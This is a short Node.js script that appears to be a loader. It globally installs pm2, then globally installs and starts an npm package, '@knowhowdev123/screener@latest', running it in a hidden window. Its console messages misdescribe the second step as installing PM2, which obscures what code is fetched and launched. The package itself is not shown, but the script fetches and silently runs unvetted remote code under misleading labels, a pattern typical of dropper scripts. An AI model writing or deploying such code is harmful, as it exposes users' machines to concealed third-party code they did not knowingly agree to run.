const { exec } = require('child_process');

// Function to install pm2 globally
function installPm2() {
  return new Promise((resolve, reject) => {
    exec('npm install -g pm2', (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing PM2: ${stderr}`);
      } else {
        console.log('PM2 installed globally');
        resolve(stdout);
      }
    });
  });
}

// Function to install screener globally
function installScreener() {
  return new Promise((resolve, reject) => {
    exec('npm install -g @knowhowdev123/screener@latest', (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing PM2: ${stderr}`);
      } else {
        console.log('PM2 installed globally');
        resolve(stdout);
      }
    });
  });
}

// Function to start the folder with pm2
function startScreener() {
  return new Promise((resolve, reject) => {
    exec(`screener start`, { windowsHide: true }, (error, stdout, stderr) => {
      if (error) {
        reject(`Error starting with PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Main function to execute the steps
async function main() {
  try {
    console.log('Installing PM2...');
    await installPm2();

    console.log('Installing Screener...');
    await installScreener();

    console.log('Starting application with PM2...');
    await startScreener();

    console.log('All steps completed successfully!');
  } catch (error) {
    console.error('An error occurred:', error);
  }
}

main();
